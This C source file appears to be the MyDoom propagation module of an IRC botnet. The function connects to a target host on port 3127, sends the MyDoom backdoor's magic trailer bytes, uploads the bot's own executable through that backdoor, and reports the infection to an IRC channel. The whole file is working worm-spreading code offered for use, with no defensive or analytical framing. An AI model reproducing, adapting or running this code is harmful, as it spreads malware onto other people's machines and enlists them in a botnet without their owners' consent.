#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_MYDOOM
BYTE MyDoomTrailor[] = "\x85\x13\x3c\x9e\xa2";

BOOL MyDoom(EXINFO exinfo)
{
	char buffer[IRCLINE];

	WSAData strWSAData;
	hostent* pstrTarget;
	SOCKET sSock;
	sockaddr_in strAddr;

	// open the file
	FILE* pFile;
	if((pFile = fopen(filename, "rb")) == NULL) 
		return FALSE;

	// windows startup
	fWSAStartup(MAKEWORD(1, 1), &strWSAData);
	
	// get target
	pstrTarget = fgethostbyname(exinfo.ip);
	if(!pstrTarget)
		return FALSE;

	memset(&strAddr, 0, sizeof(strAddr));
	strAddr.sin_family	= AF_INET;
	strAddr.sin_addr	= *(in_addr*)pstrTarget->h_addr;
	strAddr.sin_port	= fhtons(3127);
	
	// create socket
	sSock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sSock == INVALID_SOCKET) {
		fclose(pFile);
		return FALSE;
	}

	// connect
	if(fconnect(sSock, (sockaddr*)&strAddr, sizeof(strAddr)) == SOCKET_ERROR) {
		fclose(pFile);
		fclosesocket(sSock);
		
		return FALSE;
	}

	// send trailor
	if(fsend(sSock, (char*)MyDoomTrailor, 5, 0) != 5) {
		fclose(pFile);
		fclosesocket(sSock);
		
		return FALSE;
	}
	
	// send file
	char szBuffer[1024];
	while(!feof(pFile)) {
		// read
		int nRead = fread(szBuffer, 1, sizeof(szBuffer), pFile);
		
		// send
		int nSent = fsend(sSock, szBuffer, nRead, 0);
		if(nRead != nSent) {
			fclose(pFile);
			fclosesocket(sSock);
		
			return FALSE;
		}
	}

	// clean up
	fclose(pFile);
	fclosesocket(sSock);

	_snprintf(buffer, sizeof(buffer), "[MyDoom]: Exploiting IP: [%s]", exinfo.ip);
	irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);

	return TRUE;
}
#endif